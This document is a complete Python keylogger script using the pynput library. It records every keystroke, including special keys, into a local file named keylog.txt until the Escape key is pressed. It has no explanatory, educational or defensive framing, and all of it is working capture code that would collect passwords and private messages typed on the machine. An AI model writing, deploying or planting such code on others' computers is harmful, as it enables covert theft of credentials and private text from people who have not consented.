from pynput import keyboard

# Specify the log file to save the keystrokes
log_file = "keylog.txt"

# Function to handle key press events
def on_press(key):
    try:
        with open(log_file, "a") as f:
            # Write the character to the log file
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            else:
                # Write special keys in a readable format
                f.write(f" [{key}] ")

# Function to handle key release events (optional, can be omitted)
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener if the escape key is pressed
        return False

# Setting up the listener to monitor keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
